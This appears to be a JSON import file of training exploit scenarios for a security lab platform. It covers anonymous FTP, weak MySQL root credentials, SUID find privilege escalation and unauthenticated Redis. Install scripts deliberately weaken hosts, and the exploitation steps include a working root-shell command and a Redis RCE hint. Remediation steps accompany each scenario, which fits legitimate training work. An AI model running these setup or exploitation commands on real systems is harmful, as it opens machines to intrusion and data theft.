{
  "description": "Script-based exploit examples using inline bash/PowerShell",
  "usage": "POST to /api/reaper/exploits/import or use Reaper UI Import button",
  "exploits": [
    {
      "name": "weak-ftp-anonymous",
      "display_name": "Anonymous FTP Access",
      "description": "FTP server with anonymous login enabled and sensitive files accessible",
      "exploit_type": "network",
      "severity": "medium",
      "cvss_score": "5.3",
      "target_os": "linux",
      "target_services": ["vsftpd", "ftp"],
      "install_script": "#!/bin/bash\napt-get update && apt-get install -y vsftpd\n\n# Enable anonymous access\ncat > /etc/vsftpd.conf << 'EOF'\nlisten=YES\nanonymous_enable=YES\nlocal_enable=NO\nwrite_enable=NO\nanon_root=/var/ftp\nEOF\n\n# Create FTP directory with 'sensitive' files\nmkdir -p /var/ftp/public\necho 'Database credentials: admin:SuperSecret123!' > /var/ftp/public/credentials.txt\necho 'API Key: sk-live-abc123xyz789' > /var/ftp/public/api_keys.txt\nchmod -R 755 /var/ftp\n\nsystemctl restart vsftpd\nsystemctl enable vsftpd\necho 'Anonymous FTP configured'",
      "verify_script": "#!/bin/bash\ncurl -s ftp://localhost/public/credentials.txt | grep -q 'SuperSecret123' && echo 'SUCCESS'",
      "exploitation_steps": "1. Scan for open FTP: nmap -p21 target\n2. Connect: ftp target\n3. Login as 'anonymous' (no password)\n4. List files: ls public/\n5. Download: get public/credentials.txt",
      "remediation_steps": "1. Disable anonymous FTP access\n2. Require authentication for all users\n3. Remove sensitive files from FTP directories\n4. Use SFTP instead of FTP",
      "tags": ["ftp", "anonymous", "data-exposure", "training"]
    },
    {
      "name": "mysql-weak-root",
      "display_name": "MySQL Weak Root Password",
      "description": "MySQL server with weak root password and remote access enabled",
      "exploit_type": "credential",
      "severity": "critical",
      "cvss_score": "9.8",
      "target_os": "linux",
      "target_services": ["mysql"],
      "install_script": "#!/bin/bash\nexport DEBIAN_FRONTEND=noninteractive\napt-get update && apt-get install -y mysql-server\n\n# Set weak root password\nmysql -e \"ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root123';\"\n\n# Enable remote root access\nmysql -u root -proot123 -e \"CREATE USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'root123';\"\nmysql -u root -proot123 -e \"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;\"\nmysql -u root -proot123 -e \"FLUSH PRIVILEGES;\"\n\n# Allow remote connections\nsed -i 's/bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf\n\n# Create a fake sensitive database\nmysql -u root -proot123 -e \"CREATE DATABASE customer_data;\"\nmysql -u root -proot123 -e \"USE customer_data; CREATE TABLE users (id INT, name VARCHAR(100), credit_card VARCHAR(20), ssn VARCHAR(11));\"\nmysql -u root -proot123 -e \"USE customer_data; INSERT INTO users VALUES (1, 'John Doe', '4111-1111-1111-1111', '123-45-6789');\"\n\nsystemctl restart mysql\necho 'MySQL configured with weak credentials'",
      "verify_script": "#!/bin/bash\nmysql -u root -proot123 -e 'SHOW DATABASES;' 2>/dev/null | grep -q 'customer_data' && echo 'SUCCESS'",
      "exploitation_steps": "1. Scan for MySQL: nmap -p3306 target\n2. Try weak passwords: mysql -h target -u root -proot123\n3. List databases: SHOW DATABASES;\n4. Access sensitive data: SELECT * FROM customer_data.users;",
      "remediation_steps": "1. Use strong passwords (20+ chars, mixed case, symbols)\n2. Disable remote root access\n3. Use firewall rules to restrict MySQL access\n4. Encrypt sensitive data at rest",
      "tags": ["mysql", "credential", "database", "critical"]
    },
    {
      "name": "suid-find-privesc",
      "display_name": "SUID Find Binary Privilege Escalation",
      "description": "The find binary has SUID bit set, allowing privilege escalation to root",
      "exploit_type": "privesc",
      "severity": "high",
      "cvss_score": "7.8",
      "target_os": "linux",
      "target_services": [],
      "prerequisites": ["local_access"],
      "install_script": "#!/bin/bash\n# Create a low-privilege user for training\nuseradd -m -s /bin/bash trainee\necho 'trainee:trainee' | chpasswd\n\n# Set SUID on find (vulnerability)\nchmod u+s /usr/bin/find\n\necho 'SUID find vulnerability configured'",
      "verify_script": "#!/bin/bash\nls -la /usr/bin/find | grep -q 'rws' && echo 'SUCCESS'",
      "exploitation_steps": "1. Login as trainee user\n2. Find SUID binaries: find / -perm -4000 2>/dev/null\n3. Notice /usr/bin/find has SUID\n4. Escalate: find . -exec /bin/sh -p \\; -quit\n5. Verify: whoami (should show root)",
      "remediation_steps": "1. Remove SUID from find: chmod u-s /usr/bin/find\n2. Audit all SUID binaries regularly\n3. Use capabilities instead of SUID where possible\n4. Implement proper access controls",
      "tags": ["privesc", "suid", "gtfobins", "linux"]
    },
    {
      "name": "redis-unauthenticated",
      "display_name": "Redis Unauthenticated Access",
      "description": "Redis server with no authentication and bound to all interfaces",
      "exploit_type": "misconfig",
      "severity": "critical",
      "cvss_score": "9.8",
      "target_os": "linux",
      "target_services": ["redis"],
      "install_script": "#!/bin/bash\napt-get update && apt-get install -y redis-server\n\n# Configure vulnerable Redis\ncat > /etc/redis/redis.conf << 'EOF'\nbind 0.0.0.0\nprotected-mode no\nport 6379\nEOF\n\n# Store some 'sensitive' data\nsystemctl restart redis\nredis-cli SET api_key \"sk-secret-prod-key-abc123\"\nredis-cli SET db_password \"ProductionDBPassword!\"\nredis-cli SET session_secret \"super_secret_session_key\"\n\necho 'Vulnerable Redis configured'",
      "verify_script": "#!/bin/bash\nredis-cli -h localhost GET api_key | grep -q 'secret' && echo 'SUCCESS'",
      "exploitation_steps": "1. Scan for Redis: nmap -p6379 target\n2. Connect: redis-cli -h target\n3. List keys: KEYS *\n4. Extract data: GET api_key\n5. For RCE: Write SSH key via CONFIG SET",
      "remediation_steps": "1. Set a strong password: requirepass YourStrongPassword\n2. Bind to localhost only: bind 127.0.0.1\n3. Enable protected mode\n4. Use firewall rules to restrict access",
      "tags": ["redis", "misconfig", "unauthenticated", "critical"]
    }
  ]
}

